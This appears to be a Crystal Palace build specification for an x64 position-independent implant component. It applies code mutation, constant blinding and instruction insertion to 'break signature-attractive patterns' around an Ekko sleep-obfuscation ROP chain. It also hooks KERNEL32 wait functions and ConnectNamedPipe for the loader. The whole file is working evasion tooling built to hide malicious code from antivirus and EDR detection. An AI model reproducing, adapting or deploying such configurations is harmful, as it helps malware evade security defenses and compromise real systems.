x64:

  load "../../build/pico.x64.o"                                         # read the pico COFF
    make object +optimize +disco +mutate +regdance +blockparty
  
  load "../../build/hooks.x64.o"                                        # read the hooks COFF
    merge                             

  mergelib "../../crystal_palace/libtcg.x64.zip"

  # ── Constant Blinding: controlled magic pool for deterministic ised targeting ──
  magic "0xBAADF00D, 0x8BADF00D, 0xFEEDFACE, 0x0DEFACED"

  # ── ised: surgically break signature-attractive patterns in the PICO ──
  # Break signatures around EkkoObf's ROP chain setup (NtContinue, SystemFunction032 calls)
  pack $NOP "b" 0x90
  ised insert "CALL rel32" $NOP +safe

  # Split blocks around hook dispatch logic to scatter across memory with +blockparty
  ised insert "MOV" "CMP" $NULL +split +last +after

  # ── Yara rule generation for PICO ──
  rule "" 10 3 10-16

  exportfunc "setup_hooks" "__tag_setup_hooks"                          # export the hooks setup function for the loader to call
  exportfunc "set_image_info" "__tag_set_image_info"                    # export image info setter for Ekko obfuscation

  addhook "KERNEL32$WaitForSingleObjectEx" "_WaitForSingleObjectEx"     
  addhook "KERNEL32$WaitForSingleObject" "_WaitForSingleObject"         
  addhook "KERNEL32$WaitForMultipleObjects" "_WaitForMultipleObjects"                   
  addhook "KERNEL32$ConnectNamedPipe" "_ConnectNamedPipe"
  
  export